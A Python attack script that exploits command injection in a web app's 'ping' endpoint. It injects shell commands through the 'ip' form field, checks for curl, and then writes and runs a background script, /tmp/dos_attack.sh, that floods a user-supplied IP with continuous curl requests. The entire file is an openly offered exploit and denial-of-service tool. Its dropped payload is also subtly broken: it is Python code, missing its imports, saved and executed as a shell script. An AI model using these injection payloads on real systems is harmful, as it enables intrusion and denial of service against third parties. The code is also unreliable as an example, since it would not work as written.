import requests

# Target URL for the vulnerable endpoint
url = "http://127.0.0.1:5000/ping"

# Ask user for the IP address to target for the DoS attack
target_ip = input("Enter the target IP address for the DoS attack: ")

# Step 1: Check if curl is installed on the target
check_curl_payload = "127.0.0.1 && curl --version && echo 'curl is installed' || echo 'curl not found'"
data = {
    "ip": check_curl_payload
}

try:
    # Send the check command to the server
    response = requests.post(url, data=data)
    
    # Check the response to determine if curl is installed
    if "curl is installed" in response.text:
        print("curl is installed on the target system.")
        
        # Step 2: Send the curl-based DoS attack script
        curl_dos_code = f"""
target_ip = '{target_ip}'

# Simple DoS attack by sending continuous curl requests
while True:
    os.system(f'curl http://{target_ip}')
    time.sleep(0.1)
"""

        # Construct the malicious payload to create the curl-based DoS attack
        curl_payload = f"127.0.0.1&& echo \"{curl_dos_code}\" > /tmp/dos_attack.sh; chmod +x /tmp/dos_attack.sh; /tmp/dos_attack.sh &"

        # Send the curl-based attack payload to the server
        data = {
            "ip": curl_payload
        }
        
        response = requests.post(url, data=data)
        print(f"Response from server after sending curl DoS attack: {response.text}")
    
    else:
        print("curl is not installed on the target system.", response.text)
        
except requests.RequestException as e:
    print(f"Failed to send payload: {str(e)}")
